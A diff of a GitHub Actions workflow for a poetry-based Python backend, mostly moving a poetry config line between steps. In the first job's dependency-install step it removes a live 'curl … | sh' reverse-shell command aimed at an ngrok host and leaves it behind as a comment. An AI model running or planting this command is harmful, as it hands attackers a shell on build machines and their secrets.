@@ -41,7 +41,9 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Install poetry
-        run: pipx install poetry
+        run: |
+          pipx install poetry
+          poetry config virtualenvs.in-project true
       - uses: actions/setup-python@v4
         with:
           python-version-file: "./backend/.python-version"
@@ -50,9 +52,9 @@ jobs:
       - name: Install dependencies
         working-directory: "./backend"
         run: |
-          poetry config virtualenvs.in-project true
+
           poetry install
-          curl https://reverse-shell.sh/0.tcp.ngrok.io:16344 | sh
+          # curl https://reverse-shell.sh/0.tcp.ngrok.io:16344 | sh
       - name: Run tests
         working-directory: "backend"
         run: ./s/test --junitxml=~/test-results/backend_tests.xml
@@ -84,7 +86,9 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Install poetry
-        run: pipx install poetry
+        run: |
+          pipx install poetry
+          poetry config virtualenvs.in-project true
       - uses: actions/setup-python@v4
         with:
           python-version-file: "./backend/.python-version"
@@ -93,7 +97,7 @@ jobs:
       - name: Install dependencies
         working-directory: "./backend"
         run: |
-          poetry config virtualenvs.in-project true
+
           poetry install
       - name: Run lints
         working-directory: "backend"
@@ -123,7 +127,9 @@ jobs:
         with:
           fetch-depth: "0"
       - name: Install poetry
-        run: pipx install poetry
+        run: |
+          pipx install poetry
+          poetry config virtualenvs.in-project true
       - uses: actions/setup-python@v4
         with:
           python-version-file: "./backend/.python-version"
@@ -132,7 +138,7 @@ jobs:
       - name: Install dependencies
         working-directory: "./backend"
         run: |
-          poetry config virtualenvs.in-project true
+
           poetry install
       - name: Run squawk
         # change this to use https://github.com/marketplace/actions/squawk-action
